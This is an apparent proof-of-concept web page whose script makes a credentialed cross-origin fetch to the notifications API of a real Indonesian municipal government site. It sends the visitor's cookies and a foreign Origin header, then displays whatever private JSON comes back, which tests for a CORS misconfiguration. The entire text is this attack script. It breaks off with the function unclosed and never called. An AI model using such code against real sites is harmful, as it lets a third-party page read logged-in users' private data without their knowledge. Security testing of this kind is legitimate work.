<!DOCTYPE html>

    <script>
        // Fungsi untuk mengirim GET request ke endpoint /api/notifications?page=1&page_size=10
        function testGetNotifications() {
            let targetURL = "https://pakmo.mojokertokota.go.id/api/notifications?page=1&page_size=10";

            fetch(targetURL, {
                method: 'GET',
                credentials: 'include', // Sertakan kredensial seperti cookie
                headers: {
                    'Origin': 'https://pklraul.me', // Mengirimkan asal dari pklraul.me
                    'Accept': 'application/json, text/plain, */*',
                }
            })
            .then(response => {
                if (response.ok) {
                    return response.json();
                } else {
                    throw new Error('Request failed');
                }
            })
            .then(data => {
                console.log('Response from /api/notifications:', data);
                alert('Data from /api/notifications: ' + JSON.stringify(data)); // Menampilkan data dari target dalam alert box
            })
            .catch(err => console.error('Error:', err));
        }
